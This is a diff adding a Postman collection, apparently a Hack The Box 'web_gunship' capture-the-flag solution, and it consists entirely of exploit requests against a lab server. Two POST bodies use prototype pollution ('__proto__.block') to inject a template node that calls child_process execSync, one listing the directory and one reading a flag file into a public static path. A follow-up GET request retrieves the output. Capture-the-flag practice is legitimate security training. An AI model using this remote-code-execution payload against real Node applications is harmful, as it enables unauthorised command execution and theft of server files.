@@ -1,0 +1,97 @@
+{
+	"info": {
+		"_postman_id": "45f5bb39-5bd3-4400-a9e9-2025c8f1ba06",
+		"name": "web_gunship",
+		"description": "HTB challenge",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "read",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"artist.name\":\"Gingell\",\n    \"__proto__.block\": {\n        \"type\": \"Text\", \n        \"line\": \"process.mainModule.require('child_process').execSync(`cat flagXP5yw > /app/static/out`)\"\n    }\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://138.68.131.63:31332/api/submit",
+					"protocol": "http",
+					"host": [
+						"138",
+						"68",
+						"131",
+						"63"
+					],
+					"port": "31332",
+					"path": [
+						"api",
+						"submit"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "read",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://138.68.131.63:31332/static/out",
+					"protocol": "http",
+					"host": [
+						"138",
+						"68",
+						"131",
+						"63"
+					],
+					"port": "31332",
+					"path": [
+						"static",
+						"out"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "find",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"artist.name\":\"Gingell\",\n    \"__proto__.block\": {\n        \"type\": \"Text\", \n        \"line\": \"process.mainModule.require('child_process').execSync(`ls > /app/static/out`)\"\n    }\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://138.68.131.63:31332/api/submit",
+					"protocol": "http",
+					"host": [
+						"138",
+						"68",
+						"131",
+						"63"
+					],
+					"port": "31332",
+					"path": [
+						"api",
+						"submit"
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
